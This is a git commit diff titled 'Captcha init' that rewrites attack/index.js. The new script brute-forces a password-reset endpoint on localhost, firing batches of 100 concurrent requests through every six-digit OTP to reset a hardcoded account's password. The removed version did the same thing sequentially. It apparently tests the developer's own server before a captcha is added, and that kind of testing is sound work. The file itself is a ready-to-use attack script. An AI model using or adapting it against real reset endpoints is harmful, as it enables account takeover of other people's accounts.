7663b1743e6efc695d2cfddeed4ec74a170e1e6c
parameshwar-arroju <parameshwarshiva119@gmail.com>
2024-05-22 18:35:32 +0530

    Captcha init

--- attack/index.js
+++ attack/index.js
@@ -1,21 +1,37 @@
-async function main(params) {
-    
-    for (let index = 100000; index < 999999; index++) {
-        const responce = await fetch("http://localhost:3000/reset-password", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                email: "shiva@gmail.com",
-                otp: `${index}`,
-                newPassword: "gg"
-            })
-        })
-        if(responce.status == 200){
-            break
-        }
-        
-    }
+import axios from "axios";
+
+async function sendRequest(otp) {
+  let data = JSON.stringify({
+  "email": "shiva@gmail.com",
+  "otp": `${otp}`,
+  "newPassword": "shivqa"
+});
+
+let config = {
+  method: 'post',
+  url: 'http://localhost:3000/reset-password',
+  headers: { 
+    'Content-Type': 'application/json'
+  },
+  data : data
+};
+
+  try {
+    await axios.request(config);
+  } catch (error) {
+    console.error(error);
+  }
 }
+
+async function main() {
+  for (let i = 0; i < 1000000; i+=100) {
+    const promises = [];
+    console.log("here for " + i);
+    for (let j = 0; j < 100; j++) {
+      promises.push(sendRequest(i + j))
+    }
+    await Promise.all(promises);
+  }
+}
+
 main()
